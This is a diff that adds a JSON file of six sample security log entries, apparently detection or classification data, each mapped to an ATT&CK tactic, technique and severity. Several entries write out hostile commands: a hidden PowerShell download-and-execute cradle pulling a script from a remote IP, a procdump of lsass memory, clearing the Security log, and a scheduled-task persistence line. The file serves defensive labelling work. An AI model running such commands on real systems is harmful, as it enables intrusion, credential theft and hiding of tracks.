@@ -1,0 +1,8 @@
+[
+  { "id": "m1", "log": "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1') spawned by winword.exe", "tactic": "Execution", "technique": "T1059", "severity": "HIGH" },
+  { "id": "m2", "log": "Security event 4688: procdump.exe -ma lsass.exe lsass.dmp executed by user svc_backup", "tactic": "Credential Access", "technique": "T1003", "severity": "CRITICAL" },
+  { "id": "m3", "log": "wevtutil cl Security executed on DC01 by local admin", "tactic": "Defense Evasion", "technique": "T1070", "severity": "HIGH" },
+  { "id": "m4", "log": "schtasks /create /tn Updater /tr C:\\Users\\Public\\u.exe /sc onlogon", "tactic": "Persistence", "technique": "T1053", "severity": "HIGH" },
+  { "id": "m5", "log": "SMB admin share copy of payload.exe to \\\\FILESRV02\\C$ followed by remote service creation", "tactic": "Lateral Movement", "technique": "T1021", "severity": "HIGH" },
+  { "id": "m6", "log": "Outbound HTTPS beacon every 60s to rare domain update-check.example with 40 bytes jitter", "tactic": "Command and Control", "technique": "T1071", "severity": "MEDIUM" }
+]
